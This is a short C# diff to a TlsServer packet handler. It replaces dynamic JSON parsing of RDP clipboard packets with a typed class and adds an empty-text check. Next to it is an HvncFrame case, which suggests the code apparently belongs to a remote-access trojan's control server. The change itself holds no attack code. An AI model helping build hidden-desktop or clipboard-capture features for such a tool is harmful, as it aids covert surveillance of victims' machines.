@@ -340,9 +340,9 @@ public class TlsServer
                         break;
 
                     case PacketType.RdpClipboard:
-                        var clipData = JsonConvert.DeserializeObject<dynamic>(packet.Data);
-                        if (clipData?.text != null)
-                            RdpClipboardReceived?.Invoke(client.Id, (string)clipData.text);
+                        var clipMsg = JsonConvert.DeserializeObject<RdpClipboardData>(packet.Data);
+                        if (clipMsg != null && !string.IsNullOrEmpty(clipMsg.Text))
+                            RdpClipboardReceived?.Invoke(client.Id, clipMsg.Text);
                         break;
 
                     case PacketType.HvncFrame:
